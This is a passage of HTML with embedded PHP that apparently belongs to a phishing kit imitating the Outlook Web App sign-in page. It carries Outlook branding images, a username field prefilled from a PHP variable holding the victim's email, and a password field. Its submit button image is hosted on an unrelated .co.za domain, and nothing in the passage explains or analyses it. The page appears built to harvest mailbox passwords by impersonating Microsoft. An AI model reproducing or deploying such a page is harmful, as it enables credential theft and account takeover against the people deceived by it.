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" class="owaLogoSmall" aria-hidden="true" />
        </div>
    </div>
    <div class="logonContainer">
	<div id="lgnDiv" class="logonDiv" onKeyPress="return checkSubmit(event)">
        
            <div class="signInImageHeader" role="heading" aria-label="Outlook">
                <img class="mouseHeader" src="data:image/png;base64,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" alt="Outlook" />
            </div>
        
		<div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Domain\user name:</div>
		<div><input id="username" name="email" value="<?php echo $email?>" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"/ readonly required></div>
		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
		<div><input id="password" placeholder="" onfocus="g_fFcs=0" name="password" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"/ required></div>
        <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"/></div>
        <div class="showPasswordCheck signInCheckBoxText">
            <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()" />
            <span>Show password</span>
        </div>
		

		<div id="expltxt" class="signInExpl" role="alert">
			
		</div>
		<div class="signInEnter">
            <input type="image" src="https://totalqaz.co.za/owa/owa/submit.png" alt="Submit" role="button" tabIndex="0"> </div>

            </div>
            <input name="isUtf8" value="1" type="hidden"/>
		</div>
        <div class="hidden-submit"><input type="submit" tabindex="-1"/></div> 
	</div>
    </div>
    	<div id="cookieMsg" class="logonDiv" style="display:none">
		<div class="signInHeader">Outlook</div>
		<div class="signInExpl">Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></div>
		<div class="signInEnter" >
        	<div onclick="clkRtry()" style="cursor:pointer;display:inline">
        		<img class="imgLnk" 
				
					src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU1NzZGNEQzOTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU1NzZGNEQ0OTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTU3NkY0RDE5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTU3NkY0RDI5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7MvF4iAAACF0lEQVR42qyVz0sCQRTHZ5cSuqQJURRUt66GEuQlugmF0Ukw+huCjaBT0SkhEvwL6iQEERRJndIuCoLU1VsFQkH04xR0se/D79C4qLtCDz47zO6b7755M2/GUk5ZdbEwSIEEmAQRvn8ADXADTptHC++dBlsdhIfAJtgBQdXbvkAG5PCDb/OD7XIcByVwQNFLsA5iYJDE+O6SPuJbsrYq490ilulKZwrUwB4oeES8DPZBFDyDOCJvmBEHwDlFC8yrl6hy+crYc0QeMIUdMM9IN8Cb8mmI8I1jatRwtLDkaZt+Mv0P1adB/INjxbYRddBmnsKczt/0s/F2lJrhT5vgHoTkvWVZWlyPF620zb2qPHOajT/iuQQ+uaeLWPiQyyvPNiHCs+zces45G5fimGORaPGI4XHHNjrAvSv22ibilJs+0tsSV2qEfb3oo7b6Xwuw/ZGIX7gzxpi/v+LRi9g+E4nymNFKStaMrxNsGxJxnZ1Fz3haokVDdImLqi3Kti7CZ+wkXQvVHq1TnqFoyBD9dP06zfZGzgpJwxPTseKzlM3iaOVtqyL1cMUTb9o2jj6xXWOFfRtERzhWLIOffeldkTVq/QQM9yE6zDH6rMmZh9APWOXNkGSxJHzoJuib5NhVfeCb+1g+yGpVubrX4IIlH3EVRYrfrulbNc/iXleTwxPPz9V0KKl0X02Wx2Wa9rhM890u018BBgDOvaD/8G2ecwAAAABJRU5ErkJggg=="
				
			alt=""><span class="signinTxt" tabIndex="0">retry</span>
		</div>
	</div>
    </div>
</div>
</form>
<script>
    if (showPlaceholderText) {
        setPlaceholderText();
    }
</script>
</body>
</html>
